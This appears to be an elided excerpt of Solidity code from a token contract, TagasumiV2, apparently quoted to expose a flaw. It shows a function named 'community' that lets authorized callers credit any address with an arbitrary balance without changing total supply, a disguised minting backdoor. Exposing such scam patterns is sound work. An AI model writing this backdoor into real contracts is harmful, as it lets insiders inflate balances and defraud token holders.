...
contract ERC20 is Context, IBEP20 {
    ...
    function _community(address to, uint256 amount) internal virtual {
        _balances[to] = _balances[to].add(amount);
    }
...
contract TagasumiV2 is ERC20, Ownable {
    ...
    function community(address to, uint256 amount) public authorized {
        _community(to, amount);
    }
